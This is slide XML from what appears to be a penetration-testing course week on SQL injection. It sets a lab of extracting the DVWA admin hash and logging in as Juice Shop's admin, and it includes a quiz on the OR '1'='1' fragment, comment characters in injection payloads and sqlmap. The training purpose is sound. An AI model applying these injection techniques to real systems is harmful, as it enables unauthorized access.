          <a:solidFill>
            <a:srgbClr val="0F172A"/>
          </a:solidFill>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw sx="100000" sy="100000" kx="0" ky="0" algn="bl" rotWithShape="0" blurRad="101600" dist="38100" dir="5400000">
              <a:srgbClr val="1E293B">
                <a:alpha val="25000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 0" descr="preencoded.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="2011680"/>
            <a:ext cx="502920" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="2651760"/>
            <a:ext cx="324612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No Flags This Week</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="3154680"/>
            <a:ext cx="3246120" cy="2468880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Instead: extract the DVWA admin password hash, and authenticate as Juice Shop's admin, decoding the JWT to prove it. Real evidence, not a flag string.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9"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Week 7 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>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KNOWLEDGE CHECK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="841248"/>
            <a:ext cx="10058400" cy="64008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Test Yourself Before the Lab</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1691640"/>
            <a:ext cx="5257800" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2609"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86868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Q1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86868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 does the SQL fragment OR '1'='1' do inside a WHERE clause?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86868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Nothing — invalid syntax</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Makes the condition always true, so every row matches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Deletes the table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Only matches rows where a column equals literally "1"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="1691640"/>
            <a:ext cx="5257800" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2609"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="185623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Q2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="214884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Why does -- (or #) matter at the end of an injection payload?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="283464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It comments out the rest of the original query, so trailing syntax doesn't break it</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It's required by HTTP</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It encrypts the payload</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It has no effect</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4023360"/>
            <a:ext cx="5257800" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2609"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86868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Q3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86868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What's the main advantage of sqlmap over manual testing?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="86868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None — manual is always better</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It automates discovery, exploitation, and extraction across many techniques and DBMS types</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It only works on MySQL</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It doesn't need a vulnerable parameter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="4023360"/>
            <a:ext cx="5257800" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2609"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="4187952"/>
            <a:ext cx="914400" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22D3EE"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Q4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="4480560"/>
            <a:ext cx="4800600" cy="68580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In the Juice Shop login bypass, which field was actually injectable?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="5166360"/>
            <a:ext cx="4800600" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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A) password</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B) email</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C) Neither — it was a cookie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>D) The HTTP method</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="110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7 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21"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300" b="1" spc="200" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6366F1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WEEK 7 SUMMARY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="841248"/>
            <a:ext cx="10058400" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What You Now Know — and What's Next</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1828800"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>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234440" y="178308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One character can change a query's entire logic</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="211226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SQL injection is fundamentally about untrusted input being trusted as instructions.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2697480"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>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234440" y="265176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Manual first, then automate</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="298094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Understanding a payload by hand is what makes sqlmap's output make sense.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3566160"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>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03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="352044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Recap: The same flaw wears different clothes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="384962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A labeled PHP form and an unlabeled JSON API can share the exact same underlying vulnerability.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4434840"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>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22D3EE"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="4389120"/>
            <a:ext cx="9966960" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Next week: Exploit Development (Buffer Overflow)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1234440" y="4718304"/>
            <a:ext cx="9966960" cy="50292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Still Phase 3, final week — we go from application logic flaws to memory corruption itself.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="Image 0" descr="preencoded.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1">
            <a:alphaModFix amt="20000"/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10454335" y="5303520"/>
            <a:ext cx="1188720" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21"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4A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Week 7 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8991295" y="6473952"/>
            <a:ext cx="2743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2026-08-19T10:54:35Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-19T10:54:35Z</dcterms:modified>
</cp:coreProperties>
</file>